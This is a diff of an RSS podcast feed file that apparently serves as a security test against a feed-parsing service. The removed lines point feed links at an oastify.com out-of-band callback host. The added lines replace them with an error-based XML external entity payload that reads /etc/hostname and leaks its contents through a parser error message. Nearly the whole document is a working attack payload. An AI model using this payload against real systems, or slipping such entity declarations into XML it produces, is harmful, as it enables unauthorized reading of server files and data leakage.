@@ -1,13 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<!DOCTYPE rss [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % error "<!ENTITY &#x25; report SYSTEM 'file:///no-such-file/%file;'>">
+  %error;
+]>
+<rss version="2.0">
   <channel>
-    <title>Normal Podcast Test</title>
-    <link>https://hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/main</link>
-    <description>Just a normal podcast</description>
-    <item>
-      <title>Episode 1</title>
-      <enclosure url="hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/audio.mp3" length="1024" type="audio/mpeg"/>
-      <itunes:image href="https://hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/image.jpg"/>
-    </item>
+    <title>Checking Errors</title>
+    <item><title>Test</title></item>
   </channel>
 </rss>
